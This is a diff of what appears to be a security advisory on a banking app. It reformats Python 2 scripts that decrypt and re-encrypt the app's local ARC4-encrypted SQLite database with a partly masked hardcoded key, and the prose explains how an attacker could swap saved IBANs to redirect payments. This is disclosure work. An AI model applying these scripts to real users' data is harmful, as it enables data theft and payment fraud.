@@ -61,60 +61,36 @@ The following Python2 script can be used to decrypt the database.
 Copying “**HbDat001.alfdb8**” to a new directory and running the script, creates “**HbDat001.sqlite**” in the same directory (thanks to https://gist.github.com/zuccaro for the original Python code).
 
 ```
-def decryptSystemDataSQLite(file, password):  
+def decryptSystemDataSQLite(file, password):
 
- from Crypto.Hash import SHA  
-
- from Crypto.Cipher import ARC4 
-
- from struct import unpack 
-
- from tempfile import NamedTemporaryFile 
-
- from shutil import copyfile 
-
- from os import remove 
-
- ret = None 
-
- with open(file,'rb') as f: 
-
- key = SHA.new(password).digest()\[:16\] 
-
- header = ARC4.new(key).decrypt(f.read(1024)) 
-
- if header\[0:15\] == 'SQLite format 3': 
-
- declared_ps = unpack('>H',header\[16:18\])\[0\] 
-
- if declared_ps == 1: 
-
- declared_ps = 65536 
-
- t = NamedTemporaryFile(delete=False,suffix='.sqlite') 
-
- f.seek(0) 
-
- while True: 
-
- block = f.read(declared_ps) 
-
- if not block: 
-
- break 
-
- t.write(ARC4.new(key).decrypt(block)) 
-
- t.close() 
-
- ret = t.name 
-
- copyfile(ret, file.split('.')\[0\] + '.sqlite') 
-
- remove(ret) 
-
- return ret 
-
+    from Crypto.Hash import SHA 
+    from Crypto.Cipher import ARC4
+    from struct import unpack
+    from tempfile import NamedTemporaryFile
+    from shutil import copyfile
+    from os import remove
+    ret = None
+    with open(file,'rb') as f:
+        key = SHA.new(password).digest()[:16] 
+        header = ARC4.new(key).decrypt(f.read(1024)) 
+        if header[0:15] == 'SQLite format 3': 
+            print("Valid!")
+            declared_ps = unpack('>H',header[16:18])[0] 
+            if declared_ps == 1: 
+                declared_ps = 65536 
+            t = NamedTemporaryFile(delete=False,suffix='.sqlite')
+            f.seek(0) 
+            while True:
+                block = f.read(declared_ps)
+                if not block: 
+                    break  
+                t.write(ARC4.new(key).decrypt(block)) 
+            t.close() 
+            ret = t.name 
+            copyfile(ret, file.split('.')[0] + '.sqlite')
+            remove(ret)
+    return ret
+    
 decryptSystemDataSQLite('HbDat001.alfdb8','Wbf*************')
 ```
 
@@ -137,58 +113,34 @@ In addition to being able to read user data, an attacker could also copy the “
 The following Python2 script can be used to re-encrypt the database.
 
 ```
-def encryptSystemDataSQLite(file, password): 
+def encryptSystemDataSQLite(file, password):
 
- from Crypto.Hash import SHA  
-
- from Crypto.Cipher import ARC4 
-
- from struct import unpack 
-
- from tempfile import NamedTemporaryFile 
-
- from shutil import copyfile 
-
- from os import remove 
-
- ret = None 
-
- with open(file,'rb') as f: 
-
- key = SHA.new(password).digest()\[:16\] 
-
- header = (f.read(1024)) 
-
- declared_ps = unpack('>H',header\[16:18\])\[0\] 
-
- if declared_ps == 1: 
-
- declared_ps = 65536 
-
- t = NamedTemporaryFile(delete=False,suffix='.alfdb8') 
-
- f.seek(0) 
-
- while True: 
-
- block = f.read(declared_ps) 
-
- if not block: 
-
- break
-
- t.write(ARC4.new(key).encrypt(block)) 
-
- t.close() 
-
- ret = t.name 
-
- copyfile(ret, file.split('.')\[0\] + '.alfdb8') 
-
- remove(ret) 
-
- return ret 
-
+    from Crypto.Hash import SHA 
+    from Crypto.Cipher import ARC4
+    from struct import unpack
+    from tempfile import NamedTemporaryFile
+    from shutil import copyfile
+    from os import remove
+    ret = None
+    with open(file,'rb') as f:
+        key = SHA.new(password).digest()[:16]
+        header = (f.read(1024))
+        declared_ps = unpack('>H',header[16:18])[0]
+        if declared_ps == 1:
+            declared_ps = 65536
+        t = NamedTemporaryFile(delete=False,suffix='.alfdb8')
+        f.seek(0)
+        while True:
+            block = f.read(declared_ps)
+            if not block:
+                break
+            t.write(ARC4.new(key).encrypt(block))
+        t.close()
+        ret = t.name
+        copyfile(ret, file.split('.')[0] + '.alfdb8')
+        remove(ret)
+    return ret
+    
 encryptSystemDataSQLite('HbDat001.sqlite','Wbf*************')
 ```
 The malicious user could also carry out phishing attacks by modifying IBANs (for example in transactions saved as favorites), re-encrypting the database and replacing it with the user's legitimate one. If when the user send a payment he does not notice that the IBANs of a transaction saved as a favorite have been replaced, he could send the payment to the wrong IBAN.
